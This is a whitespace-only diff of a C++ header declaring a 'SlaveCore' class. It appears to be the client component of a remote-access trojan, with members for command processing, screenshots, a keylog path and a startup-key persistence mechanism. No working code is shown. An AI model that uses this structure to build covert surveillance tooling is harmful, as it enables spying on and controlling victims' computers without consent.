@@ -14,38 +14,38 @@
 
 namespace Inhibition
 {
-    class SlaveCore : public Common::NonCopyable
-    {
-        public:
+	class SlaveCore : public Common::NonCopyable
+	{
+		public:
 
-            SlaveCore(Common::ConnectionInfo info);
+			SlaveCore(Common::ConnectionInfo info);
 			~SlaveCore();
 			void exit();
-            bool connect();
-            bool acquire_stream();
-            bool process_command();
-            bool exiting();
-            void disconnect();
-            bool uninstall();
-            void upgrade();
-            const std::string& getInstallPath();
+			bool connect();
+			bool acquire_stream();
+			bool process_command();
+			bool exiting();
+			void disconnect();
+			bool uninstall();
+			void upgrade();
+			const std::string& getInstallPath();
 
 			const Common::ConnectionInfo& getConnection() const;
-            void setConnection(const Common::ConnectionInfo& info);
+			void setConnection(const Common::ConnectionInfo& info);
 			Blaspheme::Session& getSession();
 
-        private:
-			
+		private:
+
 			bool exited;
 
-            Blaspheme::Session session;
-            Malicious::Screenshot screenshot;
-            CommandDispatch dispatcher;
+			Blaspheme::Session session;
+			Malicious::Screenshot screenshot;
+			CommandDispatch dispatcher;
 
-            std::string dllPath;
-            std::string keylogPath;
-            std::string installPath;
+			std::string dllPath;
+			std::string keylogPath;
+			std::string installPath;
 			Malicious::ProgramStartupKey startup;
-    };
-    
+	};
+
 } // Inhibition
